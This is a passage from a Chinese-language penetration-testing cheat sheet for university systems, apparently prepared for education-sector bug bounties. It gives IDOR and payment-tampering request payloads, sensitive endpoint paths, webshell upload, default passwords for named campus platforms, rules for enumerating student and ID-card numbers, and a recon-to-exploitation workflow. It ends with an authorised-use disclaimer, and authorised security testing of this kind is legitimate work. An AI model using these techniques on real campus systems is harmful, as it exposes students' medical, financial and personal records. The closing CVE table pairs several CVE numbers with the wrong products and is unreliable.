| 论坛 | 二手交易支付绕过 | 修改商品价格为0或负数 | `POST /secondhand/buy {"goodsId":"G001","price":0}` |

### 10.4 就业/招聘系统

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 就业系统 | 简历越权查看 | 遍历学生ID查看他人简历(含电话邮箱) | `GET /career/resume?studentId=2021XXXXX` |
| 就业系统 | 三方协议篡改 | 修改三方协议内容或状态 | `POST /career/agreement {"studentId":"自己","company":"随便填","status":"signed"}` |
| 就业系统 | 就业去向泄露 | 全校毕业生就业去向(单位/薪资)批量导出 | `GET /career/statistics?year=2024` |

### 10.5 校医院/体检系统

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 校医院 | 体检报告越权 | 遍历学号下载他人体检报告(含身高体重、血型、病史) | `GET /hospital/report?xh=2021XXXXX` |
| 校医院 | 挂号预约越权 | 替他人挂号/取消预约 | `POST /hospital/register {"patientId":"victim"}` |
| 校医院 | 医保信息泄露 | 学生医保账户信息可遍历 | `GET /hospital/insurance?xh=2021XXXXX` |

### 10.6 校园支付/缴费

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 缴费平台 | 缴费金额篡改 | 学费/住宿费/考试费金额可改 | `POST /pay/create {"amount":0.01}` 代替实际金额 |
| 缴费平台 | 缴费状态修改 | 将未缴费订单标记为已缴费 | `POST /pay/confirm {"orderId":"O001","status":"paid"}` |
| 缴费平台 | 他人代缴越权 | 替他人缴费但不能代缴却可操作 | `POST /pay/proxy {"payer":"自己","target":"victim"}` |
| 缴费平台 | 缴费记录泄露 | 遍历订单号查他人缴费历史 | `GET /pay/record?orderId=O001` |

### 10.7 校园地图/导览/通知

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 通知系统 | 通知发布越权 | 普通用户发布全校通知 | `POST /notice/create {"title":"公告","content":"内容","scope":"all"}` student角色 |
| 通知系统 | 通知附件泄露 | 通知附件可越权下载 | `GET /notice/attach?id=123` 遍历id |
| 校园App | APK反编译密钥泄露 | 逆向校园App获取API密钥/加密算法 | `jadx-gui` 反编译 → 搜索 `apiKey` `secret` `token` `password` |
| 校园App | 接口签名绕过 | App端签名校验可在重放时绕过 | 抓包 → 签名不变重放 → 或修改参数后签名仍通过 |
| 校内问卷 | 匿名问卷身份追溯 | 匿名问卷提交的userId/apiToken在请求中 | `POST /survey/submit {"userId":"自己"}` → 改他人userId代填 |
| 校内问卷 | 问卷结果越权 | 查看他人问卷填写内容 | `GET /survey/result?surveyId=S001&userId=受害者` |

---

## 十一、教育系统通用API/接口

### 11.1 常见敏感API路径

| 系统 | 漏洞类型 | 测试方法 | Payload/示例 |
|------|----------|----------|-------------|
| 通用 | Swagger/API文档 | 探测API文档路径，发现隐藏接口 | `/swagger-ui.html` `/doc.html` `/api/doc` `/v2/api-docs` |
| 通用 | Actuator端点 | Spring Boot健康检查泄露环境变量 | `/actuator/env` `/actuator/heapdump` `/actuator/beans` |
| 通用 | Druid监控 | 阿里Druid数据库连接池未授权访问 | `/druid/index.html` → SQL监控、Session监控 |
| 通用 | 定时任务接口 | 发现内部定时任务API可手动触发 | `POST /job/execute?jobName=xxx` |
| 通用 | 数据导出接口 | 全量数据CSV/Excel导出无鉴权 | `/export/student` `/download/all` `/data/backup` |
| 通用 | 文件上传端点 | 头像/附件上传接口无限制 | `/upload` `/file/upload` `/image/upload` → 上传jsp/php |

### 11.2 校内常用框架漏洞

| 框架/系统 | 漏洞类型 | 测试方法 |
|-----------|----------|----------|
| 若依(RuoYi) | 默认口令+未授权 | `admin/admin123` → `/system/monitor` `/druid` |
| 若依(RuoYi) | SQL注入 | 若依>=4.6.0某些版本存在SQL注入 |
| Spring Boot | 未授权访问 | `/actuator` `/heapdump` `/env` |
| 微擎/WeEngine | SQL注入+文件包含 | 教育类公众号后台常见微擎框架 |
| FastAdmin | 任意文件上传 | 后台插件管理上传插件getshell |
| 通达OA | SQL注入+文件上传 | 教育系统OA多使用通达/致远/泛微 |
| 致远OA | Session泄露 | `/seeyon/` 路径泄露Session |
| 泛微OA | 任意文件读取 | `/weaver/` 文件读取漏洞 |
| ThinkPHP | 框架漏洞 | 5.x/6.x RCE注入 |

---

## 十二、信息收集与侦察

### 12.1 学号/工号规律

| 项目 | 规律示例 | 说明 |
|------|----------|------|
| 本科生学号 | `2021XXXXX` | 前4位入学年，后续为学院/专业/班级/序号 |
| 研究生学号 | `202120XXX` | 前4位入学年，不同位区分数硕士博士 |
| 教师工号 | `T001` `2021001` | 自增或入职年+序号 |
| 身份证号 | 前6位地址+8位生日+4位顺序 | 同一省份/城市学生身份证前6位相同 |
| 一卡通卡号 | 学号/身份证后6位/随机8位 | 不同学校不同规则，需要先获取样本 |

### 12.2 教育系统信息收集工具

| 目标 | 方法 | 说明 |
|------|------|------|
| 子域名 | 子域名扫描/fofa/hunter/360quake | `edu.cn` 泛解析特征需特殊处理 |
| IP段 | 教育网CIDR | `101.4.0.0/16` `202.112.0.0/16` 等教育网专有段 |
| CARSI联盟 | 查询CARSI联盟成员 | 联盟内高校互信可跨校认证 |
| 学号字典 | 从论坛/贴吧/公示信息收集 | 通过公开信息拼凑学号生成规则 |
| 系统识别 | 看页面底部版权、HTML meta、JS特征 | 识别正方/强智/金智/URP等 |
| 教务系统 | 特征页面：`index_zf.jsp` `default_xs.jsp` | 不同教务系统URL特征不同 |
| 默认密码 | 常见初始密码尝试 | 身份证后6位/学号/123456/生日/统一身份认证密码 |

### 12.3 教育系统默认口令速查

| 系统类型 | 默认用户名 | 默认密码 |
|----------|-----------|---------|
| 正方教务 | 学号/工号 | 学号/身份证后6位/123456 |
| 强智教务 | 学号/工号 | 身份证后6位/888888/空 |
| 青果教务 | 学号 | 学号/111111/000000 |
| 金智教务 | 学号 | 身份证后6位/学号 |
| 学习通 | 学号 | 学号/123456/s654321 |
| 智慧树 | 学号 | 123456/学号后6位 |
| 学校邮箱 | 学号@edu.cn | 身份证后6位/学号/Stu+学号 |
| VPN | 学号/工号 | 统一认证密码(初始同教务) |
| 校园WiFi | 学号 | 统一认证密码 |

### 12.4 教育系统漏洞挖掘流程

```
1. 信息收集阶段
   ├── 确定目标学校 → 获取学校域名/IP段
   ├── 子域名收集 → subfinder/oneforall/fofa
   ├── 系统识别 → 正方/强智/金智/URP/学习通等
   ├── 学号规律分析 → 获取样本→总结规律
   └── 默认密码猜测 → 尝试通用初始密码

2. 接口探测阶段
   ├── 目录扫描 → dirsearch/gobuster 扫描敏感路径
   ├── API文档发现 → swagger/druid/actuator
   ├── JS源码分析 → 提取API端点、密钥
   └── 抓包分析 → 注册/登录/查询各接口

3. 漏洞挖掘阶段
   ├── IDOR越权 → 遍历学号/ID参数
   ├── 逻辑漏洞 → 金额篡改/步骤跳过/并发
   ├── SQL注入 → OPAC/查询类接口
   ├── 认证绕过 → CAS/OAuth/JWT
   └── 信息泄露 → 备份文件/敏感配置

4. 证明与报告
   ├── 越权类 → 截图A账号访问B账号数据
   ├── 逻辑类 → 录屏展示操作流程
   ├── 注入类 → SQLMAP跑出数据证明
   └── 修复建议 → 权限校验/参数过滤/输入验证
```

---

## 附录：已知高危EDU-SRC漏洞CVE

| CVE编号 | 影响系统 | 漏洞类型 | 影响版本 | 利用方式 |
|---------|----------|----------|----------|----------|
| CVE-2023-27524 | 深信服SSL VPN | 认证绕过/RCE | <= 某版本 | 修改sid参数绕过认证 |
| CVE-2020-2021 | 飞塔VPN | 认证绕过 | FortiOS 6.0.x | 特殊请求绕过认证 |
| CVE-2023-28422 | Coremail | SQL注入 | 多个版本 | 构造恶意请求注入 |
| CVE-2021-22907 | 深信服 | RCE | 多个产品 | 命令注入 |
| CVE-2017-5461 | CAS服务器 | 认证绕过 | <= CAS 4.x | service参数注入 |
| CVE-2022-22965 | Spring4Shell | RCE | Spring < 5.3.18 | 教育系统广泛使用Spring |
| CVE-2021-44228 | Log4j | RCE | Log4j 2.x | 教育系统Java生态广泛受影响 |

---

> **说明**：本文档基于EDU-SRC（教育行业安全响应中心）公开报告、安全社区文章、渗透测试实战经验汇总整理。
> 所有漏洞测试应在授权范围内进行，严禁未授权测试。
> 实际挖掘时需根据目标学校的系统版本、配置差异灵活调整测试方法。
